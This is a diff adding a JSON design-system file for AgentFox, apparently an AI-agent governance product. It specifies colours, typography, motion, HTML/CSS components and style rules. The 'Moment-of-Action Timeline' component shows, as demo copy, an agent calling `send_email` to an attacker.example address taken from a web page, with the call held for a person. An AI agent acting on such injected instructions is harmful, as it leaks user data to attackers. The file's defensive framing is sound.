@@ -1,0 +1,147 @@
+{
+  "schemaVersion": 2,
+  "generatedAt": "2026-11-20T00:00:00Z",
+  "title": "Design System: AgentFox",
+  "extensions": {
+    "colorMeta": {
+      "brand-crimson": { "role": "primary", "displayName": "Gate Crimson", "canonical": "var(--af-brand)", "tonalRamp": ["#3d0c1b", "#64132d", "#8f1b40", "#a91f4a", "#c8285a", "#e0577f", "#f0668d", "#fbe3ea"] },
+      "brand-crimson-press": { "role": "primary", "displayName": "Pressed Crimson", "canonical": "var(--af-brand-press)" },
+      "night-crimson": { "role": "primary", "displayName": "Night Crimson", "canonical": "var(--af-brand) in dark theme" },
+      "ink": { "role": "neutral", "displayName": "Ledger Ink", "canonical": "var(--af-fg)", "tonalRamp": ["#1a1916", "#4a4740", "#6b675f", "#8f8b83", "#d2cfc8", "#e4e2dd", "#f5f5f3", "#ffffff"] },
+      "ink-2": { "role": "neutral", "displayName": "Second Ink", "canonical": "var(--af-fg-2)" },
+      "muted": { "role": "neutral", "displayName": "Margin Grey", "canonical": "var(--af-muted)" },
+      "ground": { "role": "neutral", "displayName": "Paper White", "canonical": "var(--af-bg)" },
+      "subtle": { "role": "neutral", "displayName": "Wash", "canonical": "var(--af-subtle)" },
+      "hairline": { "role": "neutral", "displayName": "Hairline", "canonical": "var(--af-line)" },
+      "hairline-strong": { "role": "neutral", "displayName": "Strong Hairline", "canonical": "var(--af-line-2)" },
+      "night-ground": { "role": "neutral", "displayName": "Night Ground", "canonical": "#0e0f13" },
+      "night-ink": { "role": "neutral", "displayName": "Night Ink", "canonical": "#ecedf1" },
+      "verdict-allowed": { "role": "status", "displayName": "Allowed", "canonical": "var(--af-ok)" },
+      "verdict-held": { "role": "status", "displayName": "Held", "canonical": "var(--af-warn)" },
+      "verdict-blocked": { "role": "status", "displayName": "Blocked", "canonical": "var(--af-err)" }
+    },
+    "typographyMeta": {
+      "display": { "displayName": "Display", "purpose": "Hero headline only." },
+      "statement": { "displayName": "Statement", "purpose": "The vision line above the hero headline." },
+      "headline": { "displayName": "Headline", "purpose": "Every section heading, left of the editorial split." },
+      "index-verb": { "displayName": "Index verb", "purpose": "Verbs of a ruled index." },
+      "title": { "displayName": "Title", "purpose": "Step and pair headings." },
+      "lead": { "displayName": "Lead", "purpose": "The one supporting line beside a heading." },
+      "body": { "displayName": "Body", "purpose": "Reading text." },
+      "small": { "displayName": "Small", "purpose": "Fine print, sources, table headers." },
+      "mono": { "displayName": "Mono", "purpose": "Commands, tool calls, arguments, measured values only." }
+    },
+    "shadows": [
+      { "name": "held-lift", "value": "0 18px 40px -24px color-mix(in srgb, var(--af-brand) 70%, transparent)", "purpose": "The held call in the timeline; the page's one lifted surface." },
+      { "name": "held-ring", "value": "0 0 0 5px color-mix(in srgb, var(--af-brand) 16%, transparent)", "purpose": "Halo on the held station of the timeline rail." },
+      { "name": "float", "value": "var(--af-shadow-2)", "purpose": "Things that float: mobile menu panel, hero verdict chips." }
+    ],
+    "motion": [
+      { "name": "ease-standard", "value": "cubic-bezier(.2, 0, 0, 1)", "purpose": "Every transition (var(--af-ease))." },
+      { "name": "timeline-draw", "value": "transform scaleY 1500ms ease-standard 150ms; stations at 300/650/1050ms; held box at 1500ms", "purpose": "The one authored motion. Reduced motion shows the finished state." },
+      { "name": "reveal", "value": "opacity 700ms, translateY(16px) 800ms ease-standard", "purpose": "Plain fade-up for revealed blocks; index rows stagger 80ms." },
+      { "name": "hover", "value": "150ms background/border, 300ms colour and arrow shift", "purpose": "Buttons and index rows." }
+    ],
+    "breakpoints": [
+      { "name": "xs", "value": "400px" },
+      { "name": "phone", "value": "640px" },
+      { "name": "tablet", "value": "960px" }
+    ]
+  },
+  "components": [
+    {
+      "name": "Primary Button",
+      "kind": "button",
+      "refersTo": "button-primary",
+      "description": "The one primary action per view.",
+      "html": "<a class=\"ds-btn ds-btn-primary\" href=\"#\">Get started <svg class=\"ds-arrow\" viewBox=\"0 0 12 12\" width=\"12\" height=\"12\"><path d=\"M3 9 9 3M4 3h5v5\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.6\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/></svg></a>",
+      "css": ".ds-btn { display: inline-flex; align-items: center; gap: 8px; height: 44px; padding: 0 20px; border-radius: 8px; font-family: var(--af-sans); font-size: 15px; font-weight: 500; text-decoration: none; border: 1px solid transparent; transition: background 150ms cubic-bezier(.2,0,0,1); } .ds-btn-primary { background: var(--af-brand, #c8285a); color: var(--af-on-brand, #fff); } .ds-btn-primary:hover { background: var(--af-brand-press, #a91f4a); } .ds-btn:focus-visible { outline: 2px solid var(--af-link, #c8285a); outline-offset: 3px; } .ds-arrow { transition: transform 150ms cubic-bezier(.2,0,0,1); } .ds-btn:hover .ds-arrow { transform: translate(2px,-2px); }"
+    },
+    {
+      "name": "Secondary Button",
+      "kind": "button",
+      "refersTo": "button-secondary",
+      "description": "The quiet second action beside the primary.",
+      "html": "<a class=\"ds-btn-secondary\" href=\"#\">Try a blocked call</a>",
+      "css": ".ds-btn-secondary { display: inline-flex; align-items: center; height: 44px; padding: 0 20px; border-radius: 8px; font-family: var(--af-sans); font-size: 15px; font-weight: 500; text-decoration: none; background: var(--af-bg, #fff); color: var(--af-fg, #1a1916); border: 1px solid var(--af-line-2, #d2cfc8); transition: background 150ms cubic-bezier(.2,0,0,1); } .ds-btn-secondary:hover { background: var(--af-subtle, #f5f5f3); } .ds-btn-secondary:focus-visible { outline: 2px solid var(--af-link, #c8285a); outline-offset: 3px; }"
+    },
+    {
+      "name": "Verdict Tag",
+      "kind": "chip",
+      "refersTo": "verdict-tag",
+      "description": "Allowed / held / blocked, text on a 12% tint with a dot.",
+      "html": "<span class=\"ds-tag ds-ok\">allowed</span> <span class=\"ds-tag ds-warn\">to a person</span> <span class=\"ds-tag ds-bad\">blocked</span>",
+      "css": ".ds-tag { --c: var(--af-muted, #6b675f); display: inline-flex; align-items: center; gap: 6px; height: 24px; padding: 0 10px; border-radius: 999px; font-family: var(--af-sans); font-size: 12px; font-weight: 500; color: var(--c); background: color-mix(in srgb, var(--c) 12%, transparent); } .ds-tag::before { content: \"\"; width: 6px; height: 6px; border-radius: 50%; background: currentColor; } .ds-ok { --c: var(--af-ok, #18794e); } .ds-warn { --c: var(--af-warn, #9b5a00); } .ds-bad { --c: var(--af-err, #c2301d); }"
+    },
+    {
+      "name": "Copy Chip",
+      "kind": "input",
+      "refersTo": "copy-chip",
+      "description": "A command with a crimson prompt and a copy button.",
+      "html": "<span class=\"ds-copy\"><code>uvx agentfox scan</code><button aria-label=\"Copy\"><svg width=\"14\" height=\"14\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\"><rect x=\"9\" y=\"9\" width=\"11\" height=\"11\" rx=\"2\"/><path d=\"M5 15V5a2 2 0 0 1 2-2h10\"/></svg></button></span>",
+      "css": ".ds-copy { display: inline-flex; height: 36px; border: 1px solid var(--af-line, #e4e2dd); border-radius: 8px; background: var(--af-subtle, #f5f5f3); overflow: hidden; } .ds-copy code { padding: 0 12px; line-height: 34px; font-family: var(--af-mono); font-size: 12.5px; color: var(--af-fg-2, #4a4740); } .ds-copy code::before { content: \"$ \"; color: var(--af-brand, #c8285a); } .ds-copy button { width: 36px; display: grid; place-items: center; border: 0; border-left: 1px solid var(--af-line, #e4e2dd); background: transparent; color: var(--af-muted, #6b675f); cursor: pointer; } .ds-copy button:hover { color: var(--af-fg, #1a1916); background: var(--af-bg, #fff); } .ds-copy button:focus-visible { outline: 2px solid var(--af-link, #c8285a); outline-offset: -2px; }"
+    },
+    {
+      "name": "Navigation",
+      "kind": "nav",
+      "description": "Sticky blurred bar on a hairline; brand, links, small primary.",
+      "html": "<header class=\"ds-nav\"><span class=\"ds-brand\">AgentFox</span><nav><a href=\"#\">Research</a></nav><span class=\"ds-nav-r\"><a href=\"#\">Sign in</a><a class=\"ds-nav-cta\" href=\"#\">Docs</a></span></header>",
+      "css": ".ds-nav { display: flex; align-items: center; gap: 40px; height: 64px; padding: 0 32px; background: color-mix(in srgb, var(--af-bg, #fff) 85%, transparent); backdrop-filter: blur(12px); border-bottom: 1px solid var(--af-line, #e4e2dd); font-family: var(--af-sans); } .ds-brand { font-size: 16px; font-weight: 600; letter-spacing: -0.01em; color: var(--af-fg, #1a1916); } .ds-nav nav a, .ds-nav-r a { font-size: 14px; color: var(--af-fg-2, #4a4740); text-decoration: none; } .ds-nav a:hover { color: var(--af-fg, #1a1916); } .ds-nav-r { margin-left: auto; display: flex; align-items: center; gap: 16px; } .ds-nav .ds-nav-cta { height: 36px; padding: 0 14px; display: inline-flex; align-items: center; border-radius: 8px; background: var(--af-brand, #c8285a); color: var(--af-on-brand, #fff); font-weight: 500; } .ds-nav .ds-nav-cta:hover { background: var(--af-brand-press, #a91f4a); color: var(--af-on-brand, #fff); } .ds-nav a:focus-visible { outline: 2px solid var(--af-link, #c8285a); outline-offset: 3px; }"
+    },
+    {
+      "name": "Editorial Section Head",
+      "kind": "custom",
+      "description": "Archivo heading left, one lead right; nothing above the heading.",
+      "html": "<div class=\"ds-head\"><h2>One place to control every agent you run</h2><p>From the first scan to the audit trail, for every agent, tool and MCP server in your code.</p></div>",
+      "css": ".ds-head { display: grid; grid-template-columns: minmax(0,7fr) minmax(0,5fr); gap: 20px 64px; align-items: end; } .ds-head h2 { margin: 0; font-family: var(--font-archivo), var(--af-sans); font-stretch: 106%; font-size: clamp(32px, 3.4vw, 50px); line-height: 1.08; font-weight: 500; letter-spacing: -0.02em; color: var(--af-fg, #1a1916); } .ds-head p { margin: 0; font-family: var(--af-sans); font-size: 18px; line-height: 1.55; color: var(--af-fg-2, #4a4740); }"
+    },
+    {
+      "name": "Ruled Index",
+      "kind": "custom",
+      "description": "Verbs on an ink top rule with hairline rows; verb and arrow turn crimson on hover.",
+      "html": "<ul class=\"ds-plane\"><li><a href=\"#\"><span class=\"ds-verb\">Discover</span><span class=\"ds-text\">Every agent, tool and MCP server in your repositories and agent platforms.</span><svg width=\"20\" height=\"20\" viewBox=\"0 0 20 20\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.6\"><path d=\"M4 10h12M11 5l5 5-5 5\"/></svg></a></li><li><a href=\"#\"><span class=\"ds-verb\">Govern</span><span class=\"ds-text\">Each agent gets the tools its code already uses, and nothing else.</span><svg width=\"20\" height=\"20\" viewBox=\"0 0 20 20\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"1.6\"><path d=\"M4 10h12M11 5l5 5-5 5\"/></svg></a></li></ul>",
+      "css": ".ds-plane { list-style: none; margin: 0; padding: 0; border-top: 1px solid var(--af-fg, #1a1916); } .ds-plane li { border-bottom: 1px solid var(--af-line, #e4e2dd); } .ds-plane a { display: grid; grid-template-columns: minmax(0,4fr) minmax(0,7fr) 20px; gap: 32px; align-items: center; padding: 30px 0; color: inherit; text-decoration: none; } .ds-verb { font-family: var(--font-archivo), var(--af-sans); font-stretch: 106%; font-size: clamp(30px, 3.2vw, 46px); font-weight: 500; line-height: 1; letter-spacing: -0.03em; color: var(--af-fg, #1a1916); transition: color 300ms cubic-bezier(.2,0,0,1); } .ds-text { font-family: var(--af-sans); font-size: 17px; line-height: 1.5; color: var(--af-fg-2, #4a4740); } .ds-plane svg { color: var(--af-muted, #6b675f); transition: transform 300ms cubic-bezier(.2,0,0,1), color 300ms; } .ds-plane a:hover .ds-verb, .ds-plane a:focus-visible .ds-verb { color: var(--af-brand, #c8285a); } .ds-plane a:hover svg { transform: translateX(4px); color: var(--af-brand, #c8285a); } .ds-plane a:focus-visible { outline: 2px solid var(--af-link, #c8285a); outline-offset: 3px; }"
+    },
+    {
+      "name": "Moment-of-Action Timeline",
+      "kind": "custom",
+      "description": "Rail grading from hairline to crimson; only the held call is boxed and lifted.",
+      "html": "<ol class=\"ds-path\"><li><span class=\"ds-step\">The agent calls a tool</span><span class=\"ds-ui\"><code>send_email(to=\"billing@attacker.example\")</code></span></li><li class=\"ds-held\"><span class=\"ds-step\">AgentFox checks the call</span><span class=\"ds-ui\">Held for a person. The address came from the web page.</span></li></ol>",
+      "css": ".ds-path { position: relative; list-style: none; margin: 0; padding: 0 0 0 44px; font-family: var(--af-sans); } .ds-path::before { content: \"\"; position: absolute; left: 15px; top: 34px; bottom: 34px; width: 2px; border-radius: 2px; background: linear-gradient(var(--af-line-2, #d2cfc8) 0 74%, var(--af-brand, #c8285a)); } .ds-path li { position: relative; display: grid; grid-template-columns: 220px minmax(0,1fr); gap: 24px; align-items: center; padding: 14px 0; } .ds-path li::before { content: \"\"; position: absolute; left: -35px; top: 50%; width: 12px; height: 12px; margin-top: -6px; border-radius: 50%; border: 2px solid var(--af-line-2, #d2cfc8); background: var(--af-bg, #fff); } .ds-step { font-size: 15px; font-weight: 600; color: var(--af-fg, #1a1916); } .ds-ui { padding: 14px 0; font-size: 14px; color: var(--af-fg-2, #4a4740); } .ds-ui code { font-family: var(--af-mono); font-size: 13px; color: var(--af-fg, #1a1916); } .ds-held::before { border-color: var(--af-brand, #c8285a) !important; background: var(--af-brand, #c8285a) !important; box-shadow: 0 0 0 5px color-mix(in srgb, var(--af-brand, #c8285a) 16%, transparent); } .ds-held .ds-ui { padding: 14px 16px; border: 1px solid color-mix(in srgb, var(--af-brand, #c8285a) 45%, var(--af-line, #e4e2dd)); border-radius: 10px; background: var(--af-surface, #fff); box-shadow: 0 18px 40px -24px color-mix(in srgb, var(--af-brand, #c8285a) 70%, transparent); }"
+    }
+  ],
+  "narrative": {
+    "northStar": "The Ruled Ledger",
+    "overview": "The public site reads like a well-set reference document about authority over agent actions: a white ground, ink type, and the page structured by hairline rules rather than boxes. Sections open with an editorial split, a large Archivo heading on the left and one supporting line on the right, and their content is laid out as ruled indexes, hairline tables and rows. Nothing sits above a heading.\n\nOne crimson carries all the emphasis. It marks the primary action and the call under check (the held tool call, our row in a comparison, our bar in a chart, the `$` of a command). Everything else is ink at three strengths on white. The signature image is the hero's gate canvas: an agent's traffic drawn as stacked ink ridge lines, with a thin crimson gate at the centre where calls stop or pass.\n\nDensity is generous: 136px section rhythm, a 1200px wrap, 64px between a section head and its body. Light and dark themes share every rule; dark swaps the token values via `data-theme` (or the system preference), and the closing band is always dark.",
+    "keyCharacteristics": [
+      "White ground, ink type, a single crimson accent for the action and the call under check.",
+      "Archivo, slightly expanded (width 106, statement line 116), for headings and display lines; IBM Plex Sans for reading; Geist Mono only for code, tool names and values.",
+      "Editorial split section heads, no label above a heading.",
+      "Hairline rules and ruled indexes instead of card grids.",
+      "The line-art gate canvas as the visual signature.",
+      "One authored motion: the timeline rail drawing down to the held call."
+    ],
+    "rules": [
+      { "name": "The One Voice Rule", "body": "Crimson marks the primary action and the call under check, and nothing else. If two things on a screen are crimson, one of them is the action and the other is \"ours\" in the proof.", "section": "colors" },
+      { "name": "The Errors Are Not Brand Rule", "body": "Blocked is vermilion (verdict-blocked), never crimson, and always carries a word.", "section": "colors" },
+      { "name": "The Heading Stands Alone Rule", "body": "No eyebrow, kicker or pill above a heading. The heading carries the section.", "section": "typography" },
+      { "name": "The Mono Means Code Rule", "body": "Geist Mono is used only for commands, tool names, arguments and measured values.", "section": "typography" },
+      { "name": "The Lifted Once Rule", "body": "Only the call under check is lifted. Everything else lies on the page.", "section": "elevation" }
+    ],
+    "dos": [
+      "**Do** open every section with the editorial split: Archivo heading left, one lead right, nothing above the heading.",
+      "**Do** reserve crimson for the primary action and the call under check, including \"our\" row, bar and value in proofs.",
+      "**Do** separate content with 1px hairlines and open an index or proof with a 1px ink rule.",
+      "**Do** set code, tool calls and measured values in Geist Mono, and everything else in Plex or Archivo.",
+      "**Do** read canvas and chart colours from the `--af-*` tokens so both themes stay correct.",
+      "**Do** show the finished state of any motion when the visitor prefers reduced motion."
+    ],
+    "donts": [
+      "**Don't** put an eyebrow, kicker or uppercase tracked label above a heading.",
+      "**Don't** lay out features as a grid of boxed cards; use a ruled index.",
+      "**Don't** use crimson for errors or blocked verdicts; those are vermilion with a word.",
+      "**Don't** add a second authored motion beside the timeline draw; reveals are a plain fade-up.",
+      "**Don't** lift anything with a shadow except the held call and things that float."
+    ]
+  }
+}
